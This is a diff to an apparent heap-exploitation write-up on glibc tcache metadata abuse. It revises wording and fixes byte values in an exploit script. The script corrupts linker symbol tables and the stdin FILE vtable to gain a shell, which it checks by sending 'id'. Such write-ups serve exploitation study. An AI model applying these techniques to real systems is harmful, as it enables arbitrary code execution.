@@ -219,7 +219,7 @@ glibc accepts these pointers as valid chunk addresses, modeling a common class o
 
 ## 9. Freeing Tcache Metadata Itself
 
-With tcache saturated, freeing overlapping pointers causes **tcache metadata itself** to be interpreted as an unsorted bin chunk.
+With tcache saturated, freeing heap base causes **tcache metadata itself** to be interpreted as an unsorted bin chunk.
 
 > Allocator bookkeeping data becomes attacker-controlled heap data.
 
@@ -338,7 +338,7 @@ while not found:
             heap_free(i)
 
         # -------------------------------------------------
-        # Phase 3 — Free overlapping allocator metadata
+        # Phase 3 — Free heap base
         # -------------------------------------------------
         heap_free(-4)
 
@@ -378,7 +378,7 @@ while not found:
             + LD_WRITABLE_BASE_OFFSET
             + LINKMAP_SYMTAB_OFFSET
         )
-        libc_relative_write(1, target, b"ð")
+        libc_relative_write(1, target, b"\xf0")
 
         # Overwrite a concrete Elf64_Sym entry
         target = (
@@ -393,7 +393,7 @@ while not found:
         # Phase 5 — Trigger runtime resolution via FILE corruption
         # -------------------------------------------------
         target = ARENA_TO_STDIN_OFFSET + STDIN_VTABLE_OFFSET + 7
-        libc_relative_write(1, target, b"ÿ")
+        libc_relative_write(1, target, b"\xff")
 
         io.sendline(b"id")
         if b"uid" in io.clean():
